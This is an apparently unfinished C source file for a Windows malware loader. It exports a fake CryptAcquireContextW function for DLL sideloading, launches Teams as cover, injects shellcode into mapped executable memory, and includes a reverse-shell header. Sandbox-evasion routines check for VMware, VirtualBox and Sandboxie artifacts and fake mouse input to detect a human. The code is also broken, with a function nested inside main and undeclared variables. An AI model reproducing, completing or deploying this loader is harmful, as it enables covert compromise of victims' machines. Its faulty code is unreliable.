#include <windows.h>
#include <tlhelp32.h>

#include "mapinject.h"
#include "reverse_shell.h"

// Constants
#define PSIZE 1024

// Mutex name
#define MUTEX_NAME TEXT("WindowsProc")

// Mutex management
void checkMutex() {
    HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
    if (hMutex != NULL) {
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            // Mutex already exists, indicating the payload has been executed
            ExitProcess(1);
        }
    }

    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
}

/*

    Sandbox Evasion Section

    NOTE: Do Not Use. It makes it hard to test. I just like to have the option avaiable. Plus we needed more code.

*/


// Function to evade sandboxing
void stale() {
    // Check for known sandbox artifacts
    if (isSandboxArtifactPresent()) {
        ExitProcess(1); // Exit if sandbox artifacts are detected
    }

    // Check for human-like interaction
    if (!isHumanInteractionPresent()) {
        ExitProcess(1); // Exit if human-like interaction is not detected
    }

    // Mimic user behavior to evade sandbox analysis
    mimicUserBehavior();

    // Placeholder for additional sandbox evasion techniques...
    // This may include various checks and delays to simulate normal user behavior.
}


// Sandbox artifact checks
bool checkRegistryKey(const char* keyPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
    RegCloseKey(hKey);
    return result == ERROR_SUCCESS;
}

bool checkFileExistence(const char* filePath) {
    return GetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES;
}

bool checkRunningProcesses(const char* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnap);
                return true;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return false;
}


// Human user detection
bool isHumanInteractionPresent() {
    // Check for mouse movement
    INPUT input;
    input.type = INPUT_MOUSE;
    input.mi.dx = 1;
    input.mi.dy = 1;
    input.mi.dwFlags = MOUSEEVENTF_MOVE;
    SendInput(1, &input, sizeof(INPUT));

    // Check for keyboard input
    SHORT keyState = GetAsyncKeyState(VK_SHIFT);
    if (keyState == 0 || keyState == 1) {
        // Shift key is pressed or released
        return true;
    }

    // Check for window focus changes
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow != NULL) {
        CHAR windowTitle[256];
        GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
        
        // Check if the window title is not empty (indicating potential user interaction)
        if (strlen(windowTitle) > 0) {
            return true;
        }
    }

    // Placeholder for additional checks related to human-like interaction...

    return false;
}


// Function to check sandbox artifacts
bool isSandboxArtifactPresent() {
    // Check for specific registry keys associated with sandboxes
    if (checkRegistryKey("SOFTWARE\\VMware, Inc.\\VMware Tools") || checkRegistryKey("SOFTWARE\\Oracle\\VirtualBox")) {
        return true;
    }

    // Check for specific files often present in sandboxes
    if (checkFileExistence("C:\\sbiedll.dll") || checkFileExistence("C:\\\\BoxedAppSDK64.dll")) {
        return true;
    }

    // Check for the presence of known sandbox processes
    if (checkRunningProcesses("sandbox.exe") || checkRunningProcesses("vmware.exe")) {
        return true;
    }

    return false;
}

/*

    Injection and running section

*/

// Execute Teams.exe
void execute_Teams() {
    system("teams.exe");
}

// Your main function or other parts of the program...
int main() {
    // TODO: Finish main statement
    
    __declspec(dllexport) void CryptAcquireContextW() {
        char payload[PSIZE];

        // Check if payload has already been executed using Mutex
        checkMutex();

        // Evade ML and Sandboxing checks
        if (stale() == 1)
        {
            return 0;
        };

            /*
            OLD CODE
            if (get_shellcode_from_file(payload, PAYLOAD_PATH) == 0) {
            execute_Teams();
            HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(payload), NULL);
            LPVOID lpMapAddress = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, sizeof(payload));
            memcpy((PVOID)lpMapAddress, payload, sizeof(payload));
            */

        // run teams to mimic legitimate behavior
        execute_Teams();

        // Inject process
        mapinject()


        // Execute shellcode
        __asm
        {
            mov eax, lpMapAddress
            push eax;
            ret
        }
    }
    return 0;
}
